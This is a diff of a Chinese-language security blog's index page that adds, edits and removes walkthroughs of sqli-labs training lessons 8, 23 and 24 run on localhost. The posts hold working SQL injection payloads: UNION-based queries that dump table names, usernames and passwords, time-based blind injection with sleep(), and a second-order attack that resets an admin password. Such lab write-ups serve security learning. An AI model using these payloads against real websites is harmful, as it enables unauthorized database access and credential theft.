@@ -64,6 +64,49 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-labs-Less-24" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/14/sql-labs-Less-24/" class="article-date">
+  <time datetime="2021-02-14T06:11:13.000Z" itemprop="datePublished">2021-02-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/14/sql-labs-Less-24/">sql-labs-Less-24</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-24/">http://127.0.0.1/sql/Less-24/</a></p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/1.png" alt="1"><br>注册一个新账号：admin’#,密码：123</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/2.png" alt="2"><br>再登录，然后把密码改成123456,改好后再用admin，123456登录。</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/3.png" alt="3"><br>登陆成功。<br>查看数据库：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/4.png" alt="4"></p>
+<h2>小结</h2>
+https://www.jianshu.com/p/3fe7904683ac
+https://www.cnblogs.com/cute-puli/p/11145758.html
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/14/sql-labs-Less-24/" data-id="ckl54fzm40000o8uxewbqa1dx" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql-labs-Less-23" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/13/sql-labs-Less-23/" class="article-date">
@@ -88,7 +131,8 @@
       
         <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23%EF%BC%8C%E8%BE%93%E5%85%A5?id=1">http://127.0.0.1/sql/Less-23，输入?id=1</a> 正常输出。<br>输入’发生报错：</p>
 <p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/13/sql-labs-Less-23/1.png" alt="1"><br>查看源代码：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/13/sql-labs-Less-23/2.png" alt="2"><br>发现对注释符进行了过滤，所以我们不能用注释法了，只能用闭合法。<br>再输入一个’，又正常了，说明可以用’注入。<br>注入：<br>查列数：id=1’order by 3 and’<br>查输出位置：id=-1’union select 1,2,3’<br>爆库：id=-1’union select 1,database(),3’<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23/?id=-1&#39;union">http://127.0.0.1/sql/Less-23/?id=-1&#39;union</a> select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)’<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23/?id=-1&#39;union">http://127.0.0.1/sql/Less-23/?id=-1&#39;union</a> select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=’users’)’<br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23/?id=-1&#39;union">http://127.0.0.1/sql/Less-23/?id=-1&#39;union</a> select 1,(select group_concat(username) from users),(select group_concat(password) from users)’ </p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/13/sql-labs-Less-23/2.png" alt="2"><br>发现对注释符进行了过滤，所以我们不能用注释法了，只能用闭合法。<br>再输入一个’，又正常了，说明可以用’注入。<br>注入：<br>查列数：id=1’union select 1,2,3’<br>查输出位置：id=-1’union select 1,2,3’<br>爆库：id=-1’union select 1,database(),3’<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23/?id=-1&#39;union">http://127.0.0.1/sql/Less-23/?id=-1&#39;union</a> select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)’<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23/?id=-1&#39;union">http://127.0.0.1/sql/Less-23/?id=-1&#39;union</a> select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=’users’)’<br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23/?id=-1&#39;union">http://127.0.0.1/sql/Less-23/?id=-1&#39;union</a> select 1,(select group_concat(username) from users),(select group_concat(password) from users)’ </p>
+<p>ps:可以报错注入，延时注入，可以利用 or ‘1’=’1进行闭合。<br>这里不能用order by去判断列数，因为无论order by 多少都不报错，可以理解为order by 在执行的时候被忽略了，这是由于mysql解析顺序决定的。<br>（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/annsshadow/p/5037667.html%EF%BC%89">https://www.cnblogs.com/annsshadow/p/5037667.html）</a></p>
 
       
     </div>
@@ -523,62 +567,6 @@
 
 
   
-    <article id="post-sql-labs-Less-8" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/02/02/sql-labs-Less-8/" class="article-date">
-  <time datetime="2021-02-02T12:37:45.000Z" itemprop="datePublished">2021-02-02</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/02/sql-labs-Less-8/">sql-labs-Less-8</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1>Less-8</h1>
-
-<h2>方法一：</h2>
-进入http://127.0.0.1/sql/Less-8，输入/?id=1,正常输出，加上'，无输出，再加上--+，又正常输出，说明可以用'注入。
-接下来跟Less-5和Less-6的方法差不多。
-
-<h2>方法二：时间盲注(sieep())</h2>
-进入http://127.0.0.1/sql/Less-8，输入/?id=1,正常输出，加上'，无输出，再加上--+，又正常输出，说明可以用'注入。
-再输入 order by 来判断有几列数据，即http://127.0.0.1/sql/Less-8/?id=1' order by 3--+(用二分法)
-如果输出`You are in...........`则说明有三列数据。
-因为没有输出用户名和密码，所以不能用union操作符。
-
-<p>先用length()求出数据库名的长度即<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-8/?id=1&#39;">http://127.0.0.1/sql/Less-8/?id=1&#39;</a> and if(length(database())=8,1,sleep(5))–+(length(database())=8如果为ture，则正常且较快的输出，如果为false，则要加载大约5秒，不一定能正常输出)。<br>首先求数据库名的第一个字符：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-8/?id=1&#39;">http://127.0.0.1/sql/Less-8/?id=1&#39;</a> and if(left(database(),1) &gt;= ‘a’ and left(database(),1) &lt;= ‘z’,1,sleep(5))–+<br>返回正常，然后再尝试<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-8/?id=1&#39;">http://127.0.0.1/sql/Less-8/?id=1&#39;</a> and if(left(database(),1) &gt;= ‘n’ and left(database(),1) &lt;= ‘z’,1,sleep(5))–+<br>返回正常，然后再尝试<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-8/?id=1&#39;">http://127.0.0.1/sql/Less-8/?id=1&#39;</a> and if(left(database(),1) &gt;= ‘n’ and left(database(),1) &lt;= ‘t’,1,sleep(5))–+<br>返回正常，这样依次尝试，最后求出第一位为’s’。<br>再求数据库名的第二个字符：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-8/?id=1&#39;">http://127.0.0.1/sql/Less-8/?id=1&#39;</a> and if(left(database(),<code>2</code>) &gt;= ‘<code>sa</code>‘ and left(database(),<code>2</code>) &lt;= ‘<code>sz</code>‘,1,sleep(5))–+<br>返回正常，再尝试<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-8/?id=1&#39;">http://127.0.0.1/sql/Less-8/?id=1&#39;</a> and if(left(database(),2) &gt;= ‘sa’ and left(database(),2) &lt;= ‘<code>sn</code>‘,1,sleep(5))–+<br>最后求出数据库名为’security’。</p>
-<p>接着求security数据库下的第一个表名：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-8/?id=1&#39;">http://127.0.0.1/sql/Less-8/?id=1&#39;</a> and if(left((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1) &gt;= ‘a’ and left((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1) &lt;= ‘z’,1,sleep(5))–+<br>这样按照求数据库名的方法求出第一个表名’email’。<br>求第二个表名时只要把’limit 0,1’改成’limit 1,1’就行了。<br>求出来的表名分别为’email’、’referers’、’uagents’、’users’。</p>
-<p>接着求security数据库下的第一个列名：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-8/?id=1&#39;">http://127.0.0.1/sql/Less-8/?id=1&#39;</a> and if(left((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1) &gt;= ‘a’ and left((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1) &lt;= ‘z’,1,sleep(5))–+<br>这里继续按照上面的方法来操作；求出来的列名有：’id’、’username’、’password’。</p>
-<p>最后就是取数据了，首先求id列的数据：(因为数据可能有特殊字符，所以要用ascii函数)<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-8/?id=1&#39;">http://127.0.0.1/sql/Less-8/?id=1&#39;</a> and if(ascii(left((select id from users  limit 0,1),1)) &gt;= 20 and ascii(left((select id from users limit 0,1),1)) &lt;=126,1,sleep(5))–+<br>求完id列的数据后，再求username列的数据：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-8/?id=1&#39;">http://127.0.0.1/sql/Less-8/?id=1&#39;</a> and if(ascii(left((select username from users  limit 0,1),1)) &gt;= 20 and ascii(left((select username from users limit 0,1),1)) &lt;=126,1,sleep(5))–+<br>最后在求出password列的数据：<br>    <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-8/?id=1&#39;">http://127.0.0.1/sql/Less-8/?id=1&#39;</a> and if(ascii(left((select password from users  limit 0,1),1)) &gt;= 20 and ascii(left((select password from users limit 0,1),1)) &lt;=126,1,sleep(5))–+<br>求出来的数据：<br>    <code>id：1,2,3,4,5,6,7,8,9,10,11,12,14</code><br>    <code>username：Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</code><br>    <code>password：Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</code></p>
-<h1>小结</h1>
-1.if函数
-    if(判断式,表达式A,表达式B):判断式结果为ture，运行表达式A，否则运行表达式B。<br>  
-2.sleep函数（延迟注入）
-    sleep(a):延迟a秒再运行。
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/02/sql-labs-Less-8/" data-id="ckkp0rq8t0000fkux9ev78uh9" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -615,6 +603,10 @@
       <ul>
         
           <li>
+            <a href="/2021/02/14/sql-labs-Less-24/">sql-labs-Less-24</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/13/sql-labs-Less-23/">sql-labs-Less-23</a>
           </li>
         
@@ -628,10 +620,6 @@
         
           <li>
             <a href="/2021/02/11/sql-labs-Less-19/">sql-labs-Less-19</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/10/sql-labs-Less-18/">sql-labs-Less-18</a>
           </li>
         
       </ul>
